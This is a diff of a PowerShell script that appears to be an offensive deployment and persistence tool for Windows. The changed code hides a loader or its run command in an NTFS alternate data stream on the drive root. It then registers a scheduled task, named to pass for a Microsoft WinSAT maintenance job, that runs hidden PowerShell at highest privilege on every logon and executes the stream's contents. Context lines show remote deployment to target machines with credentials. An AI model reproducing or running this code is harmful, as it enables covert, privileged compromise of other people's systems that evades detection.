@@ -337,7 +337,7 @@ function New-Loader($ADSPath, $Config) {
     $loaderPath = (Split-Path $ADSPath) + '\' + $Config.VBSPrefix + 'vbs'
     
     if($Encrypt) {
-        Write-Warning "AES detected → Using PowerShell loader"
+        Write-Warning "AES detected -> Using PowerShell loader"
         return New-PSLoader $ADSPath $Config
     }
     
@@ -395,19 +395,20 @@ function New-PersistenceMechanism($Type, $LoaderPath, $Config) {
             
             $rootADS = "C:\:ads_$((Get-Random -Minimum 1000 -Maximum 9999))"
             
-            # Store EXECUTION COMMAND, not loader source
+            # Store EXECUTION COMMAND
             if($LoaderPath.EndsWith('.vbs')) {
                 # For VBS: Store the wscript command
                 "wscript.exe //B `"$LoaderPath`"" | Set-Content -Path $rootADS -Force
-                $action = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$rootADS' | Invoke-Expression`""
             } else {
                 # For PS1: Store the PowerShell source
                 Get-Content $LoaderPath -Raw | Set-Content -Path $rootADS -Force
-                $action = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$rootADS' | Invoke-Expression`""
             }
             
             $taskName = "\Microsoft\Windows\Maintenance\WinSAT_$((Get-Random -Minimum 100 -Maximum 999))"
-            & schtasks /create /tn $taskName /tr $action /sc onlogon /rl highest /f | Out-Null
+            $action = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$rootADS' | Invoke-Expression`""
+           
+            & schtasks /create /tn $taskName /tr "$action" /sc onlogon /rl highest /f 2>&1 | Out-Null
+            
             Write-Verbose "VolRoot ADS: $rootADS -> Task: $taskName"
         }
         'reg' {
@@ -543,7 +544,7 @@ foreach($target in $Targets) {
         Write-Host "Local deployment complete" -ForegroundColor Green
     } else {
         # REMOTE DEPLOYMENT
-        Write-Host "→ Deploying to $target" -ForegroundColor Magenta
+        Write-Host "-> Deploying to $target" -ForegroundColor Magenta
         Invoke-RemoteDeployment $target $Payload $Persist $Randomize.IsPresent $Encrypt.IsPresent $NoExec.IsPresent $Credential
     }
 }
